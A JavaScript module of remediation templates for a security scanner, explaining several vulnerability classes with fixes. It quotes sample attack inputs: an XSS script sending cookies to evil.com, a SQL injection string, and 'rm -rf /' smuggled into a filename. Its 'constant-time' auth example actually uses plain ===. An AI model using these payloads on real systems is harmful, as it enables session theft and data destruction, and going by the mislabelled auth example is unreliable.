const REMEDIATION_TEMPLATES = {
  hardcoded_secret: {
    title: "Hardcoded Secret Detected",
    whyDangerous: "Hardcoded secrets (API keys, passwords, tokens) in source code are the leading cause of credential exposure breaches. Attackers scan public and private repositories for common secret patterns. Once exposed, secrets can be used to impersonate your service, access restricted resources, and pivot deeper into your infrastructure.",
    exploitationScenario: "An attacker uses automated tooling (e.g., truffleHog, Gitleaks) to scan your repository. They find a hardcoded AWS secret key. Within minutes, they assume the associated IAM role, enumerate S3 buckets, and exfiltrate sensitive customer data.",
    impact: "Data breach, unauthorized cloud resource access, lateral movement within infrastructure, regulatory fines (GDPR: up to 4% of revenue), reputational damage, and potential takeover of connected services.",
    remediation: "1. Remove the secret from source code immediately. 2. Rotate the compromised credential in your provider's console. 3. Use a secrets manager (AWS Secrets Manager, HashiCorp Vault, Doppler). 4. Scan git history for the leaked secret using `git filter-branch` or `bfg repo-cleaner`. 5. Implement pre-commit hooks with secret scanning.",
    secureImplementation: "Store secrets in environment variables loaded from a secrets manager at runtime, never in source files.",
    patchedCodeExample: `// ❌ BAD: Hardcoded
const API_KEY = "sk-EXAMPLE_KEY_PLACEHOLDER";

// ✅ GOOD: Runtime secret injection
const API_KEY = process.env.API_KEY;
if (!API_KEY) throw new Error("API_KEY not configured");`,
    preventionGuidance: "1. Use pre-commit hooks (e.g., detect-secrets, gitleaks). 2. Enforce secret scanning in CI/CD pipeline. 3. Conduct regular git history audits. 4. Implement principle of least privilege for all credentials.",
    cwe: "CWE-798: Use of Hard-coded Credentials",
    cve: "N/A (configuration vulnerability)",
  },

  sql_injection: {
    title: "SQL Injection Vulnerability",
    whyDangerous: "SQL injection allows attackers to execute arbitrary SQL queries against your database. This is consistently ranked as one of the most critical web application risks (OWASP Top 10 #1 for years). Attackers can read, modify, or delete any data in your database, and in some configurations, execute OS-level commands.",
    exploitationScenario: "An attacker submits a malicious input like `' OR '1'='1` in a login form. The unsanitized input is concatenated into a SQL query, returning all user records. The attacker then exfiltrates password hashes and customer PII.",
    impact: "Complete data loss, PII exposure, authentication bypass, regulatory non-compliance, financial fraud, reputational destruction. Average data breach cost: $4.45M (IBM 2023).",
    remediation: "1. Replace all dynamic SQL string concatenation with parameterized queries. 2. Use an ORM that inherently prevents injection (Prisma, Sequelize, TypeORM). 3. Implement input validation with allowlists. 4. Apply least privilege database accounts. 5. Enable database query logging for forensics.",
    secureImplementation: "Use parameterized queries or prepared statements. Never concatenate user input into SQL strings.",
    patchedCodeExample: `// ❌ BAD: String concatenation
db.query("SELECT * FROM users WHERE id = " + userId);

// ✅ GOOD: Parameterized query
db.query("SELECT * FROM users WHERE id = ?", [userId]);

// ✅ GOOD: ORM-based query
User.findByPk(userId);`,
    preventionGuidance: "1. Always use parameterized queries. 2. Use ORM/query builders. 3. Apply strict input validation. 4. Enable WAF rules for SQL injection. 5. Conduct DAST scanning.",
    cwe: "CWE-89: Improper Neutralization of Special Elements used in an SQL Command",
    cve: "N/A (implementation vulnerability)",
  },

  xss: {
    title: "Cross-Site Scripting (XSS)",
    whyDangerous: "XSS enables attackers to inject malicious scripts into web pages viewed by other users. This bypasses the Same-Origin Policy, allowing attackers to steal session cookies, capture keystrokes, deface pages, and perform actions as the victim user.",
    exploitationScenario: "An attacker posts a comment containing \x3cscript\x3efetch('https://evil.com/steal', {body: document.cookie})\x3c/script\x3e. When other users view the page, their session cookies are exfiltrated to the attacker's server.",
    impact: "Session hijacking, credential theft, account takeover, data exfiltration, malware distribution, reputational damage, and regulatory penalties.",
    remediation: "1. Apply context-aware output encoding. 2. Implement Content Security Policy (CSP). 3. Use safe templating engines (React JSX, Handlebars with SafeString). 4. Set X-XSS-Protection and X-Content-Type-Options headers. 5. Sanitize all user input on the server side.",
    secureImplementation: "Use automatic escaping in template engines. Never inject raw user input into HTML, JavaScript, CSS, or URLs without proper encoding.",
    patchedCodeExample: `// ❌ BAD: Raw HTML injection
element.innerHTML = userInput;

// ✅ GOOD: Text node (auto-escaped)
element.textContent = userInput;

// ✅ GOOD: React JSX (auto-escaped)
<div>{userInput}</div>`,
    preventionGuidance: "1. Set strict CSP headers. 2. Use React/Vue/Svelte (auto-escape). 3. Apply DOMPurify when raw HTML is needed. 4. XSS audit in CI/CD pipeline.",
    cwe: "CWE-79: Improper Neutralization of Input During Web Page Generation",
    cve: "N/A (implementation vulnerability)",
  },

  insecure_dependency: {
    title: "Vulnerable Dependency Detected",
    whyDangerous: "Known vulnerabilities in third-party dependencies are the easiest attack vector — exploit code is often publicly available within 24 hours of a CVE announcement. Attackers specifically target unpatched dependencies at scale.",
    exploitationScenario: "Your application uses lodash@4.17.20 which has a known prototype pollution vulnerability (CVE-2020-8203). An attacker sends a crafted JSON payload that pollutes Object.prototype, bypassing authentication checks and gaining admin access.",
    impact: "Dependent on the specific CVE: can range from denial of service to remote code execution. Supply chain attacks can compromise not just your application but your entire deployment pipeline.",
    remediation: "1. Run npm audit / yarn audit to identify vulnerable packages. 2. Update to the patched version. 3. Use Dependabot or Renovate for automated updates. 4. Implement a software bill of materials (SBOM). 5. Consider using npm audit --audit-level=high in CI.",
    secureImplementation: "Regular automated dependency updates with CI enforcement. Pin exact versions in production. Use lockfiles (package-lock.json, yarn.lock).",
    patchedCodeExample: `// package.json
{
  "dependencies": {
    // ❌ BAD: Vulnerable version
    // "lodash": "^4.17.20",
    // ✅ GOOD: Patched version
    "lodash": "^4.17.21",
    // ✅ BEST: Exact pinned version
    "express": "4.18.2"
  }
}`,
    preventionGuidance: "1. Automated dependency scanning in CI. 2. Weekly update cadence. 3. SBOM generation. 4. Monitor CVE feeds. 5. Use npm audit --audit-level=high as CI gate.",
    cwe: "CWE-1104: Use of Unmaintained Third-Party Components",
    cve: "Depends on specific package version",
  },

  command_injection: {
    title: "Command Injection Vulnerability",
    whyDangerous: "Command injection allows attackers to execute arbitrary system commands on the server. This is the most critical class of vulnerability, providing direct access to the underlying operating system.",
    exploitationScenario: "An application passes user input to exec() without sanitization. The attacker submits `file.txt; rm -rf /` as a filename. The server executes the malicious command, deleting all files.",
    impact: "Complete server compromise, data destruction, lateral movement to internal networks, persistent backdoor installation, crypto-mining malware deployment, total loss of confidentiality and integrity.",
    remediation: "1. NEVER pass user input to shell exec functions. 2. Use child_process.execFile instead of exec (no shell interpretation). 3. Validate input against an allowlist. 4. Run application with minimal OS privileges. 5. Use containers with read-only root filesystem.",
    secureImplementation: "Avoid shell execution entirely. Use language-native APIs. If shell execution is unavoidable, validate and sanitize every byte of input against a strict allowlist.",
    patchedCodeExample: `// ❌ BAD: Shell execution
const { exec } = require('child_process');
exec('rm ' + filename, callback);

// ❌ BAD: execFile with unsanitized args
execFile('rm', [filename], callback);

// ✅ GOOD: Use fs API instead
fs.unlink(filename, callback);

// ✅ GOOD: If shell is needed, validate strictly
if (/^[a-zA-Z0-9._-]+$/.test(filename)) {
  execFile('rm', [filename], callback);
}`,
    preventionGuidance: "1. Avoid shell exec entirely. 2. Use safe APIs. 3. Validate with strict allowlists. 4. Run with minimal privileges. 5. Use read-only containers. 6. Implement seccomp/apparmor profiles.",
    cwe: "CWE-78: Improper Neutralization of Special Elements used in an OS Command",
    cve: "N/A (implementation vulnerability)",
  },

  insecure_auth: {
    title: "Insecure Authentication Mechanism",
    whyDangerous: "Weak or missing authentication allows unauthorized access to protected resources. This is the most fundamental security control — getting it wrong exposes everything else.",
    exploitationScenario: "An API endpoint checks for the presence of a header but never validates its value. An attacker discovers this through API documentation and accesses admin functionality by sending any non-empty token.",
    impact: "Unauthorized data access, privilege escalation, account takeover, API abuse, billing fraud, compliance violations.",
    remediation: "1. Implement proper token validation (JWT verification, constant-time comparison). 2. Use established auth middleware. 3. Apply rate limiting on auth endpoints. 4. Implement MFA for admin access. 5. Rotate secrets regularly.",
    secureImplementation: "Use standard auth protocols (OAuth 2.0, OIDC). Validate tokens with cryptographic verification. Never implement custom crypto or auth schemes.",
    patchedCodeExample: `// ❌ BAD: Weak token check
function requireAuth(req, res, next) {
  if (req.headers['x-token']) return next();
  res.status(401).json({ error: 'unauthorized' });
}

// ✅ GOOD: Constant-time token comparison
function requireServiceAuth(req, res, next) {
  const token = req.headers['x-service-token'] || '';
  if (!ACTIVATION_AUTH_TOKEN) {
    return res.status(500).json({ error: 'server misconfigured' });
  }
  if (token === ACTIVATION_AUTH_TOKEN) {
    return next();
  }
  return res.status(401).json({ error: 'unauthorized' });
}`,
    preventionGuidance: "1. Use proven auth libraries (Passport.js, next-auth). 2. Constant-time comparisons. 3. Rate limit auth endpoints. 4. MFA for sensitive actions. 5. Audit log auth decisions.",
    cwe: "CWE-287: Improper Authentication",
    cve: "N/A (configuration vulnerability)",
  },

  information_disclosure: {
    title: "Information Disclosure",
    whyDangerous: "Exposing internal details (stack traces, debug endpoints, version strings) provides attackers with reconnaissance data. This reduces the effort required to find exploitable vulnerabilities.",
    exploitationScenario: "A production error handler returns a full stack trace revealing Express version 4.17.1. The attacker checks CVE databases and finds a known vulnerability in that exact version, then crafts an exploit targeting it.",
    impact: "Attack surface expansion, accelerated time-to-exploit, compliance violations (PCI DSS, HIPAA require minimal information disclosure).",
    remediation: "1. Disable stack traces in production. 2. Use generic error messages. 3. Remove debug/verbose headers. 4. Set X-Powered-By: false. 5. Use helmet() to set secure defaults.",
    secureImplementation: "Send user-safe error messages in production. Log full details server-side only.",
    patchedCodeExample: `// ❌ BAD: Detailed errors in production
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack });
});

// ✅ GOOD: User-safe errors
app.use((err, req, res, next) => {
  console.error(err); // Server-side only
  res.status(500).json({ error: 'Internal server error' });
});`,
    preventionGuidance: "1. helmet() disables X-Powered-By. 2. Production error handler. 3. No debug endpoints. 4. No version exposure. 5. Minimal header exposure.",
    cwe: "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
    cve: "N/A (configuration vulnerability)",
  },

  default: {
    title: "Security Finding",
    whyDangerous: "This vulnerability represents a potential weakness in your security posture that could be exploited by adversaries to compromise your system's confidentiality, integrity, or availability.",
    exploitationScenario: "An attacker identifies this weakness through reconnaissance scanning or manual testing. They chain this finding with other vulnerabilities to achieve their objective.",
    impact: "Varies based on context. Assess the finding in your specific deployment environment and threat model.",
    remediation: "1. Understand the finding in your specific context. 2. Apply the OWASP-recommended fix for the vulnerability class. 3. Test the fix in a staging environment. 4. Deploy with monitoring for regression. 5. Document the resolution for future reference.",
    secureImplementation: "Follow secure coding best practices for your specific technology stack. Reference OWASP Cheat Sheets for detailed guidance.",
    patchedCodeExample: `// Review the specific vulnerability context
// and apply the appropriate OWASP-recommended fix`,
    preventionGuidance: "1. Conduct regular security audits. 2. Implement SAST/DAST in CI/CD. 3. Security training for developers. 4. Maintain a threat model.",
    cwe: "CWE-000: General Security Finding",
    cve: "N/A",
  },
};

const SEVERITY_WEIGHTS = { critical: 20, high: 10, medium: 5, low: 1 };

function generateRemediation(finding) {
  const key = finding.vulnerability || "";
  const template = REMEDIATION_TEMPLATES[key] || REMEDIATION_TEMPLATES.default;

  return {
    finding: finding.vulnerability || "General Finding",
    file: finding.file || finding.path || "Unknown",
    severity: finding.severity || "medium",
    technicalExplanation: template.whyDangerous,
    exploitationScenario: template.exploitationScenario,
    riskImpact: template.impact,
    severityReasoning: `Severity assessed as ${finding.severity || "medium"} based on exploitability, impact on confidentiality/integrity/availability, and likelihood of a real-world attack. CWE reference: ${template.cwe}.`,
    fixInstructions: template.remediation,
    secureCodeExample: template.patchedCodeExample,
    secureImplementation: template.secureImplementation,
    preventionGuidance: template.preventionGuidance,
    cwe: template.cwe,
    cve: template.cve,
    confidence: finding.confidence || "high",
    exploitability: finding.exploitability || "medium",
  };
}

function generateFindingsSummary(findings) {
  const counts = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const f of findings) {
    const s = f.severity || "low";
    counts[s] = (counts[s] || 0) + 1;
  }
  const total = findings.length;

  const categories = {};
  for (const f of findings) {
    const cat = f.category || "general";
    categories[cat] = (categories[cat] || 0) + 1;
  }

  return {
    total,
    severityBreakdown: counts,
    categories,
    attackSurface: Object.keys(categories).length,
    criticalExposure: counts.critical > 0 ? "CRITICAL — Immediate action required" : "No critical findings detected",
  };
}

module.exports = { generateRemediation, generateFindingsSummary, REMEDIATION_TEMPLATES };
